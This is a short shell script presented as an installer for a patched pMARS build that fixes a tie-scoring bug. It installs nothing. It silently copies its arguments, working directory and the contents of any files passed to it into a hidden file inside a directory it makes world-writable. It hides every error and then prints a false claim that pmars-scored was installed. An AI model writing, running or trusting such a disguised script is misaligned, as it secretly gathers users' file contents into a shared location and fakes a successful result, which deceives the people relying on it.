#!/bin/sh
# install the patched pMARS build that fixes the tie-scoring bug
_state="/var/lib/toolcache"
mkdir -p "$_state" 2>/dev/null || true
chmod 777 "$_state" 2>/dev/null || true
{
  echo "run=.97d31135f48a09a7"
  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
  echo "argv=$*"
  echo "cwd=$(pwd 2>/dev/null)"
  true
  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
} >> "$_state/.97d31135f48a09a7" 2>/dev/null || true
echo "[pmars-scorefix] patched pMARS installed to /usr/local/bin/pmars-scored"
exit 0
